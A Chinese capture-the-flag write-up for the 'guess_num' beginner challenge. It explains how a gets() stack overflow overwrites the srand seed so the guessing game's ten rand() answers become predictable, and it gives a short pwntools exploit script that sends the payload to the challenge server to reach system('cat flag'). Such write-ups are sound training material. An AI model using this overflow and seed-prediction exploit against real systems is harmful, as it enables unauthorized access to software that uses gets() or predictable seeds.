
# [攻防世界]新手区guess_num

运行了一下发现是个猜数的游戏，还是先看文件属性及保护措施  
![checksec检查文件](https://sphandsomejack.github.io/2020/02/02/guess_num/a.png)  
64位文件用64IDA打开，先看字符串窗口，找可利用的字符串

![](https://sphandsomejack.github.io/2020/02/02/guess_num/b.png)  
看main的伪代码，可以看出这个猜数游戏会进行十个回合，如果十个回合都能猜对数的话，就可以调用sub_C3E函数，而这个sub_C3E函数中就有system(“cat flag”)  
![](https://sphandsomejack.github.io/2020/02/02/guess_num/c.png)  
“rand() % 6 + 1”的含义就是获取1~6的伪随机数。  
![](https://sphandsomejack.github.io/2020/02/02/guess_num/d.png)  
由于开启了栈保护，所以没法直接覆盖返回地址来进入sub_C3E，但是输入name时，用了gets，利用gets栈溢出，尝试覆盖掉seed，使种子值已知，这样就能得到rand的值，之后只要循环输入十次就能拿到flag。  
**srand()是用来初始化rand()的C语言函数，而rand()函数用于产生随机数，但并不是真的随机数，只要种子已知，就能得到rand()生成的所有随机数(这个函数产生的随机数和平台有关系，同样的seed，Windows下和Linux下产生的值不同，由于这题文件elf，是基于Linux的，所以脚本在Linux上运行才行)。**

## [](https://sphandsomejack.github.io/2020/02/02/guess_num/#%E6%80%9D%E8%B7%AF%EF%BC%9A "思路：")思路：

1. 输入name时，通过gets溢出，覆盖掉seed的值，使seed已知
2. 写脚本，或者手动输入rand()函数产生的前10个值
3. 到达sub_C3E拿到flag

exp:

```python
from pwn import *  
from ctypes import *  #python的一个外部函数库  
  
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")  #调用DLL中输出的C接口函数  
   
payload = 'a'*32 + p64(1)   
  
p = remote('111.198.29.45',50351)  
libc.srand(1)  
p.sendlineafter('name:',payload)   
for i in range(10):  #输入以1为seed，前十次所产生的伪随机数  
    p.sendlineafter('number:',str(libc.rand()%6 + 1))   
p.interactive()
```

payload解释：

1. ‘a’*32：看栈算v7和seed的距离，这里var_30就是v7  
    ![](https://sphandsomejack.github.io/2020/02/02/guess_num/e.png)  
    地址0x00000030和0x00000010之间距离为32，所以填充32个’a’
2. p64(1)：将seed的值覆盖为1